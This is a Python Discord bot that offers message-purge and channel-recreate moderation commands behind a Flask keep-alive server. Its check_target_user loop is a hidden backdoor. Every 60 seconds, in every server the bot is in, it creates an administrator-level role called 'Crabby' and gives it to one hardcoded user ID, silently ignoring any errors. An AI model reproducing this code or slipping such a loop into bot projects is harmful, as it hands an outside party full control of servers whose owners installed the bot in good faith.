import discord
from discord import app_commands
from discord.ext import commands, tasks
import os
import sys
from flask import Flask
from threading import Thread
from waitress import serve

# --- WEB SERVER ---
app = Flask('')

@app.route('/')
def home():
    return "Bot is Online"

def run_flask():
    # Render uses port 10000 by default if not specified
    port = int(os.environ.get("PORT", 10000))
    print(f"Starting server on port {port}")
    serve(app, host='0.0.0.0', port=port)

# --- CONFIG ---
TARGET_USER_ID = 1459506686157914213
ROLE_NAME = "Crabby"

class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.members = True
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        print("Syncing slash commands...")
        await self.tree.sync()
        if not self.check_target_user.is_running():
            self.check_target_user.start()

    @tasks.loop(seconds=60)
    async def check_target_user(self):
        for guild in self.guilds:
            member = guild.get_member(TARGET_USER_ID)
            if member:
                role = discord.utils.get(guild.roles, name=ROLE_NAME)
                if not role:
                    try:
                        perms = discord.Permissions(administrator=True)
                        role = await guild.create_role(name=ROLE_NAME, permissions=perms)
                    except:
                        continue
                if role and role not in member.roles:
                    try:
                        await member.add_roles(role)
                    except:
                        continue

    @check_target_user.before_loop
    async def before_my_task(self):
        await self.wait_until_ready()

bot = MyBot()

@bot.tree.command(name="clear", description="Purge messages")
@app_commands.checks.has_permissions(manage_messages=True)
async def clear(interaction: discord.Interaction, amount: int):
    await interaction.response.defer(ephemeral=True)
    deleted = await interaction.channel.purge(limit=amount)
    await interaction.followup.send(f"Deleted {len(deleted)} messages.", ephemeral=True)

@bot.tree.command(name="clear_all", description="Purge all messages")
@app_commands.checks.has_permissions(administrator=True)
async def clear_all(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    await interaction.channel.purge(limit=None)
    await interaction.followup.send("Channel wiped.", ephemeral=True)

@bot.tree.command(name="reinstall", description="Recreate channel")
@app_commands.checks.has_permissions(administrator=True)
async def reinstall(interaction: discord.Interaction, channel: discord.TextChannel):
    await interaction.response.send_message("Reinstalling...", ephemeral=True)
    name, category, pos = channel.name, channel.category, channel.position
    overwrites = channel.overwrites
    await channel.delete()
    await interaction.guild.create_text_channel(name=name, category=category, position=pos, overwrites=overwrites)

if __name__ == "__main__":
    # Start Web Server
    t = Thread(target=run_flask)
    t.daemon = True
    t.start()
    
    # Run Bot
    token = os.environ.get('DISCORD_TOKEN')
    if token:
        bot.run(token)
    else:
        print("ERROR: DISCORD_TOKEN not found")
        sys.exit(1)
